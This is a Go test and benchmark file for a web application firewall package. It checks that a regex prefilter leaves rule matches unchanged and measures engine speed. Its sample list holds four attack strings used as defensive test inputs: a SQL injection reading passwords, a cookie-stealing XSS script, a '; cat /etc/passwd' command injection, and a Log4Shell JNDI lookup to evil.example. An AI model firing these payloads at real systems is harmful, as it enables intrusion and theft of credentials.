package edgewaf

// Engine options must not change a verdict. These tests compare each engine
// configuration with and without them on every sample the package knows,
// and the benchmarks measure what they save.
//
//	go test ./pkg/edgewaf/ -run '^$' -bench 'Prefilter' -benchtime 3s
//	FAAS_WAF_FTW_DIR=... go test ./pkg/edgewaf/ -run TestCRSRegressionCorpusEngineEquivalence -v

import (
	"fmt"
	"math/rand/v2"
	"net/http"
	"os"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/corazawaf/coraza/v3"

	"github.com/onebox-faas/faas/pkg/api"
	"github.com/onebox-faas/faas/pkg/gateway"
)

var prefilterOn = engineOptions{rxPrefilter: true}

// engineConfig is one of the three engines the gateway runs, built with
// given options, and how a sample is prepared for it.
type engineConfig struct {
	name  string
	build func(engineOptions) (coraza.WAF, error)
	prep  func(gateway.WAFSample) gateway.WAFSample
}

func engineConfigs() []engineConfig {
	sampled := func(pl int) engineConfig {
		return engineConfig{
			name:  fmt.Sprintf("sampled PL%d", pl),
			build: func(o engineOptions) (coraza.WAF, error) { return compileWith(pl, o) },
			prep:  func(s gateway.WAFSample) gateway.WAFSample { s.ParanoiaLevel = pl; return s },
		}
	}
	return []engineConfig{sampled(1), sampled(2), {
		name:  "in-path PL1",
		build: compileInlineWith,
		prep:  func(s gateway.WAFSample) gateway.WAFSample { s.Body = nil; return s },
	}}
}

// equivalenceSamples is every request shape the package tests use: the
// benign corpus, the in-path attacks, and body attacks.
func equivalenceSamples() []gateway.WAFSample {
	var out []gateway.WAFSample
	for _, br := range benignCorpus() {
		out = append(out, br.s)
	}
	out = append(out, inlineAttacks()...)
	for _, attack := range []string{
		"1' UNION SELECT password FROM users--",
		"<script>alert(document.cookie)</script>",
		"; cat /etc/passwd",
		"${jndi:ldap://evil.example/a}",
	} {
		out = append(out, benchSample(1, jsonBody(api.EdgeWAFDefaultInspectBodyBytes, attack)))
	}
	return out
}

// compareEngines reports every sample whose matched rules or score differ
// between the two engines.
func compareEngines(t *testing.T, name string, base, candidate coraza.WAF, samples []gateway.WAFSample) {
	t.Helper()
	for i, s := range samples {
		want, err := evaluateAll(base, s)
		if err != nil {
			t.Fatalf("%s sample %d: %v", name, i, err)
		}
		got, err := evaluateAll(candidate, s)
		if err != nil {
			t.Fatalf("%s sample %d: %v", name, i, err)
		}
		slices.Sort(want.matched)
		slices.Sort(got.matched)
		if got.Score != want.Score || !slices.Equal(got.matched, want.matched) {
			t.Errorf("[%s] %s %s: with options matched %v (score %d), without %v (score %d)",
				name, s.Method, s.URI, got.matched, got.Score, want.matched, want.Score)
		}
	}
}

// TestRxPrefilterKnownFalseNegative pins why engine.rxPrefilter is off:
// Coraza v3.8.1's SecRxPreFilter rejects "2.2250738585072011e-308" for rule
// 942220, whose regex matches it. The minimal pattern is 2(?:x|.2250): the
// prefilter demands "22250" across the ".". When this test fails, the
// upstream bug is fixed: rerun TestCRSRegressionCorpusEngineEquivalence and
// consider turning the prefilter on (ADR-831 amendment 6).
func TestRxPrefilterKnownFalseNegative(t *testing.T) {
	s := sample(http.MethodGet, "/get?i=2.2250738585072011e-308", nil, "")
	for _, tc := range []struct {
		opts engineOptions
		want bool
	}{{engineOptions{}, true}, {prefilterOn, false}} {
		waf, err := compileInlineWith(tc.opts)
		if err != nil {
			t.Fatal(err)
		}
		res, err := evaluateAll(waf, s)
		if err != nil {
			t.Fatal(err)
		}
		if got := slices.Contains(res.matched, 942220); got != tc.want {
			t.Errorf("prefilter=%v: 942220 matched = %v, want %v", tc.opts.rxPrefilter, got, tc.want)
		}
	}
}

func TestRxPrefilterEquivalence(t *testing.T) {
	for _, cfg := range engineConfigs() {
		base, err := cfg.build(engineOptions{})
		if err != nil {
			t.Fatal(err)
		}
		candidate, err := cfg.build(prefilterOn)
		if err != nil {
			t.Fatal(err)
		}
		var samples []gateway.WAFSample
		for _, s := range equivalenceSamples() {
			samples = append(samples, cfg.prep(s))
		}
		compareEngines(t, cfg.name, base, candidate, samples)
	}
}

// TestCRSRegressionCorpusEngineEquivalence compares the engines with and
// without prefilterOn on every replayable CRS regression test (opt-in, like
// TestCRSRegressionCorpus). With Coraza v3.8.1 it fails on 942220, as
// TestRxPrefilterKnownFalseNegative pins.
func TestCRSRegressionCorpusEngineEquivalence(t *testing.T) {
	dir := os.Getenv("FAAS_WAF_FTW_DIR")
	if dir == "" {
		t.Skip("set FAAS_WAF_FTW_DIR to a CRS tests/regression/tests checkout")
	}
	cases, _ := loadFTWCases(t, dir)
	for _, cfg := range engineConfigs() {
		base, err := cfg.build(engineOptions{})
		if err != nil {
			t.Fatal(err)
		}
		candidate, err := cfg.build(prefilterOn)
		if err != nil {
			t.Fatal(err)
		}
		samples := make([]gateway.WAFSample, len(cases))
		for i, c := range cases {
			samples[i] = cfg.prep(c.sample)
		}
		compareEngines(t, cfg.name, base, candidate, samples)
		t.Logf("[%s] %d samples compared", cfg.name, len(samples))
	}
}

// inPathBenchSamples is the benign header and URI traffic of the in-path
// load test.
func inPathBenchSamples() []gateway.WAFSample {
	var out []gateway.WAFSample
	for _, br := range benignCorpus() {
		if !br.content && br.inPathFP == nil {
			s := br.s
			s.Body = nil
			out = append(out, s)
		}
	}
	return out
}

// BenchmarkInlinePrefilter compares the in-path engines: stock @rx, with
// Coraza's pre-filter, and @grx (ADR-831 amendment 10) without an app (no
// cache) and with one, whose cache the repeated samples hit.
func BenchmarkInlinePrefilter(b *testing.B) {
	samples := inPathBenchSamples()
	for _, v := range []struct {
		name string
		opts engineOptions
		app  string
	}{{"stock", engineOptions{}, ""}, {"prefilter", prefilterOn, ""}, {"grx", ownRxOn, ""}, {"grx-cached", ownRxOn, "app-bench"}} {
		waf, err := compileInlineWith(v.opts)
		if err != nil {
			b.Fatal(err)
		}
		b.Run(v.name, func(b *testing.B) {
			b.ReportAllocs()
			for n := range b.N {
				s := samples[n%len(samples)]
				s.AppID = v.app
				if _, err := evaluate(waf, s); err != nil {
					b.Fatal(err)
				}
			}
		})
	}
}

// variedSample is base as one of many visitors would send it: a session
// cookie and a query value no other request repeats, a page number and a
// User-Agent from small pools, so @grx's cache can only help with what real
// traffic repeats.
func variedSample(base gateway.WAFSample, n int) gateway.WAFSample {
	agents := []string{
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
		"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
		"curl/8.7.1", "python-requests/2.32.3", "Go-http-client/1.1",
	}
	s := base
	s.Header = base.Header.Clone()
	sep := "?"
	if strings.Contains(s.URI, "?") {
		sep = "&"
	}
	s.URI += sep + "page=" + strconv.Itoa(n%50) + "&t=" + strconv.FormatInt(time.Now().UnixNano(), 36)
	s.Header.Set("Cookie", "theme=dark; session="+strconv.FormatUint(rand.Uint64(), 36)+strconv.FormatUint(rand.Uint64(), 36))
	s.Header.Set("User-Agent", agents[n%len(agents)])
	return s
}

// BenchmarkInlineVaried is BenchmarkInlinePrefilter on variedSample
// traffic: the cache's gain without the repeated samples' best case.
func BenchmarkInlineVaried(b *testing.B) {
	samples := inPathBenchSamples()
	for _, v := range []struct {
		name string
		opts engineOptions
		app  string
	}{{"stock", engineOptions{}, ""}, {"grx", ownRxOn, ""}, {"grx-cached", ownRxOn, "app-bench"}} {
		waf, err := compileInlineWith(v.opts)
		if err != nil {
			b.Fatal(err)
		}
		b.Run(v.name, func(b *testing.B) {
			for n := range b.N {
				s := variedSample(samples[n%len(samples)], n)
				s.AppID = v.app
				if _, err := evaluate(waf, s); err != nil {
					b.Fatal(err)
				}
			}
		})
	}
}

func BenchmarkSampledPrefilter(b *testing.B) {
	for _, opts := range []engineOptions{{}, prefilterOn} {
		waf, err := compileWith(1, opts)
		if err != nil {
			b.Fatal(err)
		}
		for _, shape := range []struct{ name, body string }{
			{"headers", ""},
			{"json-8KiB", jsonBody(api.EdgeWAFDefaultInspectBodyBytes, "")},
		} {
			s := benchSample(1, shape.body)
			if shape.body == "" {
				s = sample(http.MethodGet, "/api/orders?page=2&sort=created", nil, "")
			}
			b.Run(fmt.Sprintf("%s/prefilter=%v", shape.name, opts.rxPrefilter), func(b *testing.B) {
				b.ReportAllocs()
				for range b.N {
					if _, err := evaluate(waf, s); err != nil {
						b.Fatal(err)
					}
				}
			})
		}
	}
}
